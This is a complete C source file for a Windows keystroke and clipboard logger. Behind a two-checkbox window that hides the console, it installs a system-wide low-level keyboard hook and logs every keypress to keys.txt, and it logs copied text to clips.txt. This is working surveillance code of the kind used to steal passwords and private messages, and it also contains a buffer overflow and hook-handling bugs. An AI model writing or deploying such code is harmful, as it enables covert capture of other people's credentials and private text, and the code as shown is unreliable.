#include <windows.h>
#include <stdio.h>
#define CLIP 0
#define KEY 1

const TCHAR newLine[2] = {13, 10};

void InitGui(HWND hWnd) {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     SetWindowLongA(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);
     CreateWindow("BUTTON", "Clipboard", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 10, 100, 25, hWnd, (HMENU) CLIP, NULL, NULL);
     CreateWindow("BUTTON", "Keystrokes", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 110, 10, 100, 25, hWnd, (HMENU) KEY, NULL, NULL);
}

void RepaintGui(HWND hWnd) {
     PAINTSTRUCT ps;
     FillRect(BeginPaint(hWnd, &ps), &ps.rcPaint, (HBRUSH) (COLOR_WINDOW + 1));
     EndPaint(hWnd, &ps);
}

LRESULT PaintCtrl(WPARAM wParam) {
    SetBkMode((HDC) wParam, TRANSPARENT);
    return (LRESULT) GetStockObject(NULL_BRUSH);
}

void BeforeClose(HWND hWnd, HHOOK hHook) {
    ChangeClipboardChain(hWnd, NULL);
    UnhookWindowsHookEx(hHook);
    PostQuitMessage(0);    
}

void ProcessCheck(HWND hWnd, WPARAM wParam, HHOOK* phHook, LRESULT (*pKeyProc)(INT, WPARAM, LPARAM)) {
    switch(wParam) {
        case CLIP:
            if(IsDlgButtonChecked(hWnd, CLIP) == BST_UNCHECKED) {
                CheckDlgButton(hWnd, CLIP, BST_CHECKED);
                SetClipboardViewer(hWnd);
            }
            else {
                CheckDlgButton(hWnd, CLIP, BST_UNCHECKED);
                ChangeClipboardChain(hWnd, NULL);
            }
            break;
       case KEY:
           if(IsDlgButtonChecked(hWnd, KEY) == BST_UNCHECKED) {
               CheckDlgButton(hWnd, KEY, BST_CHECKED);
               *phHook = SetWindowsHookEx(WH_KEYBOARD_LL, pKeyProc, NULL, 0);
           }
           else {
               CheckDlgButton(hWnd, KEY, BST_UNCHECKED);
               UnhookWindowsHookEx(*phHook);
           }
           break;
    }
}

void WriteDateTime(HANDLE hFile) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    INT dateSize = GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
    TCHAR date[dateSize];
    GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, date, dateSize);
    INT timeSize = GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
    TCHAR time[timeSize];
    GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, time, timeSize);
    WriteFile(hFile, date, dateSize - 1, NULL, NULL);
    WriteFile(hFile, " ", 1, NULL, NULL);
    WriteFile(hFile, time, timeSize - 1, NULL, NULL);
    WriteFile(hFile, ": ", 2, NULL, NULL);
}

void ClipProc(HWND hWnd) {
    if(!OpenClipboard(hWnd)) return;
    HANDLE clipData = GetClipboardData(CF_UNICODETEXT);
    if(!clipData) return;
    LPCWSTR wideClipText = (LPCWSTR) GlobalLock(clipData);
    GlobalUnlock(clipData);
    CloseClipboard();
    if(!wideClipText) return;
    INT clipTextSize = WideCharToMultiByte(CP_UTF8, 0, wideClipText, -1, NULL, 0, NULL, NULL);
    TCHAR clipText[clipTextSize];
    WideCharToMultiByte(CP_UTF8, 0, wideClipText, -1, clipText, clipTextSize, NULL, NULL);
    HANDLE hFile = CreateFile("clips.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteDateTime(hFile);
    WriteFile(hFile, newLine, 2, NULL, NULL);
    WriteFile(hFile, clipText, clipTextSize - 1, NULL, NULL);
    WriteFile(hFile, newLine, 2, NULL, NULL);
    WriteFile(hFile, newLine, 2, NULL, NULL);
    CloseHandle(hFile);
}

LRESULT CALLBACK KeyProc(INT nCode, WPARAM wParam, LPARAM lParam) {
    if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
        DWORD key = p->vkCode;
        UINT mapped = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
        UINT ch = mapped != 0 ? mapped : key;
        TCHAR hex[8];
        sprintf(hex, "0x%02X '%c'", key, ch);
        HANDLE hFile = CreateFile("keys.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteDateTime(hFile);
        WriteFile(hFile, hex, 8, NULL, NULL);
        WriteFile(hFile, newLine, 2, NULL, NULL);
        CloseHandle(hFile);
    }
    return 0;
}